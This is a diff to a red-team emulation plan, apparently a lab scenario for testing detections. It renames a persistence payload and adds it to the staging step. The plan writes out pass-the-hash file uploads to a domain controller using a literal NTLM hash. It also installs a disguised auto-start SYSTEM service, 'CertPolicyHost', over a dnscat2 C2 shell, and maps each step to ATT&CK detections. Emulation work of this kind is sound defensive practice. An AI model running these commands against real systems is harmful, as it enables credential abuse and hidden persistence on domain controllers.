@@ -14,7 +14,7 @@ Four persistence mechanisms follow (Steps 4–7), each with optional alternative
 
 ### Voice Track
 
-All persistence mechanisms (Steps 4–7) depend on `policyupdate.exe`, `policysync.exe`,
+All persistence mechanisms (Steps 4–7) depend on `policyupdate.exe`, `policysync.exe`, `policysync-host.exe`,
 `ServiceInstaller.exe`, and `NtServiceInstaller.exe` being present on DC01. Rather than
 stage these payloads on-demand as each persistence step executes, they are consolidated
 and transferred to DC01 in this single step **before any persistence mechanisms run**.
@@ -37,6 +37,7 @@ staging overhead.
   ```text
   C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\policyupdate.exe C:\ProgramData\policyupdate.bin
   C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\policysync.exe C:\ProgramData\policysync.bin
+  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\policysync-host.exe C:\ProgramData\policysync-host.bin
   C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\ServiceInstaller.exe C:\ProgramData\ServiceInstaller.bin
   C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.bin
   ```
@@ -49,6 +50,8 @@ staging overhead.
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded <n> bytes → \\C$\C$\ProgramData\policysync.exe
     [+] Authenticated as TESTLAB\Administrator
+    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\policysync-host.exe
+    [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded <n> bytes → \\C$\C$\ProgramData\ServiceInstaller.exe
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded <n> bytes → \\C$\C$\ProgramData\NtServiceInstaller.exe
@@ -58,7 +61,7 @@ staging overhead.
 
   ```text
   command (dc01) 2> shell
-  C:\ProgramData> dir policyupdate.exe policysync.exe ServiceInstaller.exe NtServiceInstaller.exe
+  C:\ProgramData> dir policyupdate.exe policysync.exe policysync-host.exe ServiceInstaller.exe NtServiceInstaller.exe
   ```
 
 ### Reference Tables
@@ -447,13 +450,13 @@ persistence that does not rely on Event ID 7045.
 
 ### Voice Track
 
-`ServiceInstaller.exe` installs `policysync.exe` as a named auto-start Windows
+`ServiceInstaller.exe` installs `policysync-host.exe` as a named auto-start Windows
 service by calling the Service Control Manager APIs directly (`OpenSCManagerW`,
 `CreateServiceW`, and `ChangeServiceConfig2W`). This avoids spawning `sc.exe` while
 still using the normal SCM service creation path.
 
 The service is immediately visible to SCM and can be started in the same step. SCM
-launches `policysync.exe` as `LocalSystem`, so the resulting C2 session runs as
+launches `policysync-host.exe` as `LocalSystem`, so the resulting C2 session runs as
 `NT AUTHORITY\SYSTEM` on DC01. Unlike Step 4's transient service execution, this
 service is persistent: the service registry key remains under
 `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost`, `Start` is set to auto-start,
@@ -464,7 +467,7 @@ and the service survives reboot until explicitly deleted.
 - ☣️ From the DC01 dnscat2 shell, install the API-created Windows service
 
   ```text
-  C:\ProgramData> ServiceInstaller.exe install C:\ProgramData\policysync.exe CertPolicyHost "Certificate Policy Host" "Maintains certificate policy synchronization"
+  C:\ProgramData> ServiceInstaller.exe install C:\ProgramData\policysync-host.exe CertPolicyHost "Certificate Policy Host" "Maintains certificate policy synchronization"
   ```
 
   - ***Expected Output***
@@ -504,7 +507,7 @@ and the service survives reboot until explicitly deleted.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | -
-| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | `ServiceInstaller.exe` creates Windows service `CertPolicyHost` on DC01 with `ImagePath = C:\ProgramData\policysync.exe`; System Event ID 7045 records the service install; service key exists at `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost` with `Start = 2` and `ObjectName = LocalSystem` | Calibrated - Not Benign | `ServiceInstaller.exe install` calls SCM APIs directly to create an auto-start service for `policysync.exe`; the persistent service object is independently verifiable through Event ID 7045 and the service registry key | DC01 | TESTLAB\Administrator | [ServiceInstaller.exe](../../resources/payloads/persistence/windows-service/advapi32-cpp/ServiceInstaller.exe), [service_installer.cpp](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
+| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | `ServiceInstaller.exe` creates Windows service `CertPolicyHost` on DC01 with `ImagePath = C:\ProgramData\policysync-host.exe`; System Event ID 7045 records the service install; service key exists at `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost` with `Start = 2` and `ObjectName = LocalSystem` | Calibrated - Not Benign | `ServiceInstaller.exe install` calls SCM APIs directly to create an auto-start service for `policysync-host.exe`; the persistent service object is independently verifiable through Event ID 7045 and the service registry key | DC01 | TESTLAB\Administrator | [ServiceInstaller.exe](../../resources/payloads/persistence/windows-service/advapi32-cpp/ServiceInstaller.exe), [service_installer.cpp](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
 | Defense Evasion | T1036.004 | Masquerading: Masquerade Task or Service | Windows | `ServiceInstaller.exe` creates service name `CertPolicyHost` with display name `Certificate Policy Host` and description `Maintains certificate policy synchronization`, causing the malicious service object to resemble a benign certificate-policy component | Not Calibrated - Not Benign | The service name, display name, and description are chosen to blend with legitimate Windows certificate-policy infrastructure; this is an evasion attribute of the same service object already scored under `T1543.003`, not a separate persistence outcome | DC01 | TESTLAB\Administrator | [service_installer.cpp InstallService()](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
-| Execution | T1569.002 | System Services: Service Execution | Windows | `services.exe` starts `C:\ProgramData\policysync.exe` as service `CertPolicyHost`; System Event ID 7036 records service running state | Not Calibrated - Not Benign | Start substep: `ServiceInstaller.exe start CertPolicyHost` triggers SCM to launch the already-created persistence service; execution confirms the service works but the scored behavior is the persistent service creation in T1543.003 | DC01 | NT AUTHORITY\SYSTEM | [service_installer.cpp StartServiceByName()](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
+| Execution | T1569.002 | System Services: Service Execution | Windows | `services.exe` starts `C:\ProgramData\policysync-host.exe` as service `CertPolicyHost`; System Event ID 7036 records service running state | Not Calibrated - Not Benign | Start substep: `ServiceInstaller.exe start CertPolicyHost` triggers SCM to launch the already-created persistence service; execution confirms the service works but the scored behavior is the persistent service creation in T1543.003 | DC01 | NT AUTHORITY\SYSTEM | [service_installer.cpp StartServiceByName()](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
 
